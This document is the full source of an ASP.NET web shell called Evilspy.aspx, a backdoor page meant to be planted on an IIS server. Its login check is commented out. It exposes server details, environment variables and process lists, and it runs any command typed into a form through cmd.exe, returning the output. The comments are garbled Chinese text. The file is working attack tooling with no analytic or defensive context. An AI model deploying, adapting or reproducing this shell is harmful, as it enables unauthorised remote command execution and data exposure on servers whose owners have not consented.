   <%@page Language="VB" Debug="true" trace="false" validateRequest=false %>
   <%@ import namespace="System.IO"%>
   <%@ import namespace="System.Net"%>
   <%@ Import Namespace="System.Diagnostics" %>
   <script Language="VB" runat="server">
   '------------------------------------
   'SoftWare:Evilspy.aspx--asp.netÄ¾Âí
   'Designer:swords[EST]
   'QQ:78623269
   'Blog:http://angler.126.com
   'Demo:Çë²»ÒªÓÃÓÚ·Ç·¨ÓÃÍ¾,·¢ÏÖbugÇëÖ¸Õý¡£
   '------------------------------------

   private evilspy as string="Evilspy.aspx--ASP.netÄ¾Âí"
   Sub Page_Load(Src as object, E as EventArgs)
       'if session(evilspy)<>"evilspy" then
           call login()
       'else
           dim act as string
           dim action as string=request.params("act")
           select case action
               case "info"
                   call info()
               case "cmdshell"
                   call cmdshell()
               case else
                   call info()
           end select
       'end if
   end sub

   sub login()

   end sub


   sub info()
       lblinfo.visible="true"
       lblinfo.text+=("<b>¿Í»§¶ËIP:</b>" & request.ServerVariables("REMOTE_ADDR") & "<br>")
       lblinfo.text+=("<b>¿Í»§¶Ëä¯ÀÀÆ÷:</b>" & request.ServerVariables("HTTP_USER_AGENT") & "<br>")
       lblinfo.text+=("<b>·þÎñÆ÷°æ±¾:</b> " & Environment.OSVersion.tostring() & "<br>")
       lblinfo.text+=("<b>IIS°æ±¾:</b>" & request.ServerVariables("SERVER_SOFTWARE") & "<br>")
       lblinfo.text+=("<b>·þÎñÆ÷Ãû:</b> "  &Environment.MachineName &"<br>")
       lblinfo.text+=("<b>·þÎñÆ÷IP: </b>")
       Dim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList
       Dim i As Integer
       For i = 0 To addressList.Length - 1
           lblinfo.text+= addressList(i).ToString() & "<br>"
       Next i
       lblinfo.text+=("<b>·þÎñÆ÷ÔËÐÐÊ±¼ä:</b> "  &Environment.TickCount/1000/60/60 &"Ð¡Ê±<br>")
       lblinfo.text+=("<b>UserDomainName:</b> "  &Environment.UserDomainName &"<br>")
       lblinfo.text+=("<b>WorkingSet:</b> "  &Environment.WorkingSet &"<br>")
       lblinfo.text+=("<b>UserName:</b> "  &Environment.UserName &"<br>")
       lblinfo.text+=("<b>UserInteractive:</b> "  &Environment.UserInteractive &"<br>")
       lblinfo.text+=("<b>Âß¼ÅÌ  :</b> ")
       Dim drives As [String]()= Environment.GetLogicalDrives()
       Dim d As string
       For Each d In drives
               lblinfo.text+="<b> " & d & " </b>"
       next d

       lblinfo.text+=("<p><b>»·¾³±äÁ¿  :</b>")
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
       Dim de As DictionaryEntry
       For Each de In environmentVariables
               lblinfo.text+="<b>" & de.Key & ":</b>" & de.Value & "<br>"
       next de
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       lblinfo.text+ ="<p><b>µ±Ç°½ø³Ì£º</b>"
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       Dim p As Process
       For Each p In Process.GetProcesses()
           lblinfo.text+ = p.ToString() & "<br>"
       Next p
       lblinfo.text+ = "<br>----------------------------------------------<br>"

   end sub

   sub cmdshell()
       tbcmd.visible="true"
       btcmd.visible="true"
       lblcmd.visible="true"
   end sub

   Sub runcmd(Src As Object, E As EventArgs)

       dim psi As New ProcessStartInfo("cmd.exe")
       psi.UseShellExecute = False
       psi.RedirectStandardOutput = true

       dim pro as new process()
       pro.startinfo=psi
       pro.startinfo.arguments="/c " & tbcmd.text
       pro.start()

       dim objreader as streamreader=pro.standardoutput
       lblcmd.text="<pre>" & objreader.readtoend & "</pre>"
       objreader.close()
       pro.close()
   End Sub

   sub footer()
       response.write("<p><b>designer: swords[E.S.T] 2005,5</b>")
   end sub
   </script>

   <html><title><%=evilspy%></title><body>
   <div style="padding:15,15,15,15;font-size:10pt;font-family:verdana";
   border-width:2px 2px 2px 2px; border-style:solid; border-color:black;">
   <center><a href="http://wmjie.51.net/swords/" target="_blank"><%=evilspy%></a><p></center>
   <center>[<a href="?act=info">·þÎñÆ÷²ÎÊý</a>] | [<a href="?act=cmdshell">cmdshell</a>]| [<a href="#">¿ª·¢ÖÐ..</a>] </center>
   <form runat="server">
   <asp:label id="lblinfo" runat="server" visible="false" maintainstate="false"/><p>
   <asp:textbox id="tbcmd" runat="server" visible="false"/>
   <asp:button id="btcmd" text="runcmd" onclick="runcmd" runat="server" visible="false"/><p>
   <asp:label id="lblcmd" runat="server"  visible="false"/>
   </form>
   <%
   call footer()
   %>
   </div>
   </body></html>
